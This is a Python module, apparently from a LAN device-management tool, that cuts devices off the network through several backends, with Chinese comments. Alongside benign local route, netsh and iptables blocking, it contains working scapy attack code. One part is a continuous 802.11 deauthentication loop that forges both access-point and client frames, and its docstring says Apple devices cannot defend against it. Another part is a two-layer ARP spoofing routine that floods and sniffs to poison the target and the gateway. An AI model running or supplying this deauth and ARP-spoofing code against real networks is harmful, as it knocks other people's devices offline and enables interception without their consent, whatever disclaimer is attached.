"""阻断模块 — 多后端支持。

后端对比:
  deauth   : 802.11 WiFi Deauth 踢下线(跨平台,需 Npcap,WiFi 卡需支持发包)。
             直接让目标设备掉线,iPad/iPhone 无法防御。**Windows 对付苹果首选**
  arp      : 双层 ARP 欺骗(L1 广播泛洪+L2 请求嗅探),跨平台。对 Windows/Linux/
             安卓有效;iOS 有 ARP 防护,不一定生效。
  route    : 本机路由表封禁(Windows: route add;Linux: ip route blackhole)。
             仅阻断本机↔目标,不影响目标访问外网。
  netsh    : Windows 防火墙按 IP 阻断本机↔目标,同 route 一样仅限本机。
  iptables : 仅 Linux,按 MAC 在 FORWARD 链 DROP(本机做网关时有效)。

deauth 与 arp 对比:
  - deauth 工作在 802.11 管理帧层,不需要劫持 ARP,iOS 无法防御
  - arp 工作在 IP/ARP 层,iOS 可丢弃免费 ARP 来防御
  - deauth 的代价:目标会立即掉线并尝试重连,较"暴力"
  - arp 的代价:部分设备(尤其是 Apple)不生效

注意事项:
  - deauth 需要 WiFi 网卡驱动支持原始 802.11 帧注入,部分网卡不支持
  - 如果 deauth 也无效,只能通过路由器后台做 MAC 黑名单(方案 6)

⚠️ 仅可在你拥有或获得授权的网络中使用。
"""

import subprocess
import threading
import time
from typing import Dict, Optional, Tuple

from sqlalchemy.orm import Session

from ..config import settings
from ..utils.logger import logger
from ..models.device import Device
from ..ws.manager import manager
from ..ws.events import device_blocked as ws_blocked, device_unblocked as ws_unblocked
from .audit import write_audit


_active: Dict[int, threading.Event] = {}


def get_active_ids() -> list[int]:
    return list(_active.keys())
_gw_cache: Optional[Tuple[str, str, str, str]] = None  # (gw_ip, iface, my_mac, gw_mac)


# ========== 网关/接口自动检测 ==========

def _detect_gateway() -> Tuple[str, str, str, str]:
    global _gw_cache
    if _gw_cache:
        return _gw_cache
    from scapy.all import ARP, Ether, conf, get_if_hwaddr, srp

    route = conf.route.route("0.0.0.0")
    gw_ip = route[2]
    iface = route[0]
    my_mac = get_if_hwaddr(iface)

    gw_mac = ""
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip)
        ans, _ = srp(pkt, timeout=2, iface=iface, verbose=0)
        if ans:
            gw_mac = ans[0][1].hwsrc.lower()
    except Exception as e:
        logger.warning(f"[blocker] resolve gateway MAC failed: {e}")

    _gw_cache = (gw_ip, iface, my_mac, gw_mac)
    logger.info(
        f"[blocker] gateway detect: ip={gw_ip} iface={iface} "
        f"my_mac={my_mac} gw_mac={gw_mac or '(unknown)'}"
    )
    return _gw_cache


def _refresh_gw_mac() -> str:
    global _gw_cache
    from scapy.all import ARP, Ether, srp

    gw_ip, iface, my_mac, _old_gw_mac = _detect_gateway()
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip)
        ans, _ = srp(pkt, timeout=2, iface=iface, verbose=0)
        if ans:
            new_mac = ans[0][1].hwsrc.lower()
            _gw_cache = (gw_ip, iface, my_mac, new_mac)
            return new_mac
    except Exception as e:
        logger.warning(f"[blocker] refresh gateway MAC failed: {e}")
    return ""


# ===================================================================
#  deauth — 802.11 WiFi 解除认证,踢目标下线
# ===================================================================

def _deauth_loop(
    target_mac: str,
    ap_mac: str,
    iface: str,
    stop_event: threading.Event,
):
    """持续对目标设备发送 802.11 Deauth 帧,使其无法保持 WiFi 连接。

    发送双向 deauth:
      - 伪装 AP 通知目标: "你已被解除认证"
      - 伪装目标通知 AP: "我要断开连接"

    reason=7 = "Class 3 frame received from nonassociated STA"
    间隔 0.5s 对抗自动重连。
    """
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

    # 伪装 AP → 目标: 解除认证
    deauth_from_ap = RadioTap() / Dot11(
        type=0, subtype=12,          # Management / Deauthentication
        addr1=target_mac,             # 目标设备
        addr2=ap_mac,                 # 伪装成 AP
        addr3=ap_mac,                 # BSSID
    ) / Dot11Deauth(reason=7)
    # 伪装目标 → AP: 断开连接
    deauth_from_client = RadioTap() / Dot11(
        type=0, subtype=12,
        addr1=ap_mac,                 # AP
        addr2=target_mac,             # 伪装成目标
        addr3=ap_mac,
    ) / Dot11Deauth(reason=7)

    logger.info(
        f"[blocker] deauth loop started: target={target_mac} ap={ap_mac} iface={iface}"
    )
    while not stop_event.is_set():
        try:
            sendp(deauth_from_ap, iface=iface, verbose=0)
            sendp(deauth_from_client, iface=iface, verbose=0)
        except Exception as e:
            logger.error(f"[blocker] deauth send error: {e}")
        time.sleep(0.5)


def _deauth_cancel_thread(target_mac: str, ap_mac: str, iface: str):
    """阻塞解除时发送一次广播解除认证来清除状态(最佳努力)。"""
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    try:
        pkt = RadioTap() / Dot11(
            type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
            addr2=ap_mac, addr3=ap_mac,
        ) / Dot11Deauth(reason=7)
        sendp(pkt, count=1, iface=iface, verbose=0)
    except Exception:
        pass


# ===================================================================
#  arp — 双层 ARP 欺骗
# ===================================================================

def _arp_mitm(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    my_mac: str,
    iface: str,
    stop_event: threading.Event,
):
    from scapy.all import ARP, send

    pkt_to_target = ARP(
        op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
        psrc=gateway_ip, hwsrc=my_mac,
    )
    pkt_to_gw = ARP(
        op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
        psrc=target_ip, hwsrc=my_mac,
    )

    logger.info(
        f"[blocker] L1 flood started: target={target_ip}({target_mac}) "
        f"↔ gw={gateway_ip}({gateway_mac}) via {iface}"
    )
    burst_end = time.time() + 5
    while time.time() < burst_end and not stop_event.is_set():
        try:
            send(pkt_to_target, iface=iface, verbose=0)
            send(pkt_to_gw, iface=iface, verbose=0)
        except Exception as e:
            logger.error(f"[blocker] L1 burst error: {e}")
        time.sleep(0.2)
    logger.info("[blocker] L1 burst done, switching to steady interval")

    while not stop_event.is_set():
        try:
            send(pkt_to_target, iface=iface, verbose=0)
            send(pkt_to_gw, iface=iface, verbose=0)
        except Exception as e:
            logger.error(f"[blocker] L1 send error: {e}")
        time.sleep(1.0)


def _arp_mitm_oneway(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    my_mac: str,
    iface: str,
    stop_event: threading.Event,
):
    from scapy.all import ARP, send

    pkt = ARP(
        op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
        psrc=gateway_ip, hwsrc=my_mac,
    )

    logger.warning(
        f"[blocker] L1 flood one-way (no gw MAC): target={target_ip} gw={gateway_ip}"
    )
    burst_end = time.time() + 5
    while time.time() < burst_end and not stop_event.is_set():
        try:
            send(pkt, iface=iface, verbose=0)
        except Exception as e:
            logger.error(f"[blocker] L1 burst error: {e}")
        time.sleep(0.2)

    while not stop_event.is_set():
        try:
            send(pkt, iface=iface, verbose=0)
        except Exception as e:
            logger.error(f"[blocker] L1 send error: {e}")
        time.sleep(1.0)


def _arp_sniff_spoof(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    my_mac: str,
    iface: str,
    stop_event: threading.Event,
):
    from scapy.all import ARP, AsyncSniffer, send

    def _on_arp(pkt):
        if stop_event.is_set():
            return False
        if not pkt.haslayer(ARP):
            return
        arp = pkt[ARP]
        if arp.op != 1:
            return
        if arp.psrc == target_ip and arp.pdst == gateway_ip:
            reply = ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=gateway_ip, hwsrc=my_mac,
            )
            send(reply, iface=iface, verbose=0)

    logger.info(f"[blocker] L2 sniff started: watching {target_ip} → {gateway_ip}")
    sniffer = AsyncSniffer(iface=iface, filter="arp", prn=_on_arp, store=False)
    sniffer.start()
    stop_event.wait()
    sniffer.stop()
    logger.info(f"[blocker] L2 sniff stopped: {target_ip}")


def _arp_restore(
    target_ip: str,
    target_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    iface: str,
):
    from scapy.all import ARP, send

    send(
        ARP(op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac),
        count=3, iface=iface, verbose=0,
    )
    send(
        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
            psrc=target_ip, hwsrc=target_mac),
        count=3, iface=iface, verbose=0,
    )
    logger.info(f"[blocker] ARP restored: {target_ip} ↔ {gateway_ip}")


# ===================================================================
#  route — 本机路由表封禁
# ===================================================================

def _route_block(ip: str) -> None:
    """Windows: route add <ip> mask 255.255.255.255 0.0.0.0
       Linux:   ip route add blackhole <ip>/32"""
    import sys
    if sys.platform == "win32":
        subprocess.run(
            ["route", "add", ip, "mask", "255.255.255.255", "0.0.0.0"],
            check=True,
        )
    else:
        subprocess.run(
            ["ip", "route", "add", "blackhole", f"{ip}/32"],
            check=True,
        )


def _route_unblock(ip: str) -> None:
    import sys
    if sys.platform == "win32":
        subprocess.run(["route", "delete", ip], check=False)
    else:
        subprocess.run(["ip", "route", "delete", "blackhole", f"{ip}/32"], check=False)


# ===================================================================
#  iptables (Linux only)
# ===================================================================

def _iptables_block(mac: str) -> None:
    subprocess.run(
        ["iptables", "-I", "FORWARD", "-m", "mac", "--mac-source", mac, "-j", "DROP"],
        check=True,
    )


def _iptables_unblock(mac: str) -> None:
    subprocess.run(
        ["iptables", "-D", "FORWARD", "-m", "mac", "--mac-source", mac, "-j", "DROP"],
        check=False,
    )


# ===================================================================
#  netsh (Windows 防火墙 — 仅本机 ↔ 目标)
# ===================================================================

def _netsh_rule_name(ip: str) -> str:
    return f"name=DAC_BLOCK_{ip}"


def _netsh_block(ip: str) -> None:
    for direction in ("in", "out"):
        subprocess.run(
            ["netsh", "advfirewall", "firewall", "add", "rule",
             _netsh_rule_name(ip), f"dir={direction}", "action=block",
             f"remoteip={ip}"],
            check=True,
        )


def _netsh_unblock(ip: str) -> None:
    subprocess.run(
        ["netsh", "advfirewall", "firewall", "delete", "rule",
         _netsh_rule_name(ip)],
        check=False,
    )


# ===================================================================
#  对外接口
# ===================================================================

def block_device(
    db: Session,
    device: Device,
    gateway_ip: str = "",
    actor: str = "system",
    reason: str = "",
    blocked_until=None,  # datetime | None,定时到期自动解除
) -> None:
    logger.info(
        f"[blocker] block_device called: device_id={device.id} "
        f"ip={device.ip} backend={settings.blocker_backend}"
        + (f" until={blocked_until}" if blocked_until else "")
    )
    if device.id in _active:
        logger.warning(f"[blocker] device {device.id} already active, skip")
        return

    backend = settings.blocker_backend

    # --- deauth: 802.11 踢下线 ---
    if backend == "deauth":
        try:
            _gw_ip, iface, _my_mac, ap_mac = _detect_gateway()
            if not ap_mac:
                raise RuntimeError(
                    "deauth 需要 AP MAC(网关 MAC),但解析失败。"
                    "网关可达? 以管理员运行?"
                )
            stop = threading.Event()
            t = threading.Thread(
                target=_deauth_loop,
                args=(device.mac, ap_mac, iface, stop),
                daemon=True,
            )
            t.start()
            _active[device.id] = stop
            logger.info(
                f"[blocker] deauth started: target={device.ip}({device.mac}) "
                f"ap={ap_mac} iface={iface}"
            )
        except Exception as e:
            logger.error(
                f"[blocker] deauth setup failed for {device.ip}: {e}  "
                f"(Npcap 已装? WiFi 网卡支持帧注入? 以管理员运行?)"
            )

    # --- arp: L1 泛洪 + L2 嗅探 ---
    elif backend == "arp":
        try:
            gw_ip, iface, my_mac, gw_mac = _detect_gateway()
            gateway_ip = gateway_ip or gw_ip
            gw_mac = _refresh_gw_mac()

            stop = threading.Event()

            if gw_mac:
                t1 = threading.Thread(
                    target=_arp_mitm,
                    args=(device.ip, device.mac, gateway_ip, gw_mac,
                          my_mac, iface, stop),
                    daemon=True,
                )
            else:
                t1 = threading.Thread(
                    target=_arp_mitm_oneway,
                    args=(device.ip, device.mac, gateway_ip,
                          my_mac, iface, stop),
                    daemon=True,
                )
            t1.start()

            t2 = threading.Thread(
                target=_arp_sniff_spoof,
                args=(device.ip, device.mac, gateway_ip,
                      my_mac, iface, stop),
                daemon=True,
            )
            t2.start()

            _active[device.id] = stop
            logger.info(
                f"[blocker] L1+L2 both started for {device.ip}; "
                f"if target still online, try backend=deauth instead"
            )
        except Exception as e:
            logger.error(
                f"[blocker] ARP setup failed for {device.ip}: {e}  "
                f"(Npcap 已安装? 以管理员运行? AP 隔离已关?)"
            )

    # --- route: 本机路由表 ---
    elif backend == "route":
        _route_block(device.ip)
        _active[device.id] = threading.Event()

    # --- iptables: Linux FORWARD ---
    elif backend == "iptables":
        _iptables_block(device.mac)
        _active[device.id] = threading.Event()

    # --- netsh: Windows 防火墙(仅本机) ---
    elif backend == "netsh":
        _netsh_block(device.ip)
        _active[device.id] = threading.Event()

    device.status = "blocked"
    if blocked_until is not None:
        device.blocked_until = blocked_until
    db.commit()
    write_audit(db, actor=actor, action="block",
                target_device_id=device.id, reason=reason)

    manager.broadcast_sync(ws_blocked(device, reason))


def unblock_device(
    db: Session,
    device: Device,
    actor: str = "system",
    reason: str = "",
) -> None:
    if device.id in _active:
        _active[device.id].set()
        _active.pop(device.id, None)

    backend = settings.blocker_backend

    if backend == "deauth":
        # 线程已通过 stop_event 停止,无需额外恢复(目标自动重连 WiFi)
        logger.info(f"[blocker] deauth stopped for {device.ip}, target will reconnect")

    elif backend == "arp":
        try:
            gw_ip, iface, _my_mac, gw_mac = _detect_gateway()
            if gw_mac:
                _arp_restore(device.ip, device.mac, gw_ip, gw_mac, iface)
            else:
                logger.warning(
                    f"[blocker] cannot restore ARP for {device.ip}: "
                    f"gateway MAC unknown"
                )
        except Exception as e:
            logger.error(f"[blocker] ARP restore failed for {device.ip}: {e}")

    elif backend == "route":
        _route_unblock(device.ip)

    elif backend == "iptables":
        _iptables_unblock(device.mac)

    elif backend == "netsh":
        _netsh_unblock(device.ip)

    device.status = "offline"
    device.blocked_until = None
    db.commit()
    write_audit(db, actor=actor, action="unblock",
                target_device_id=device.id, reason=reason)

    manager.broadcast_sync(ws_unblocked(device, reason))
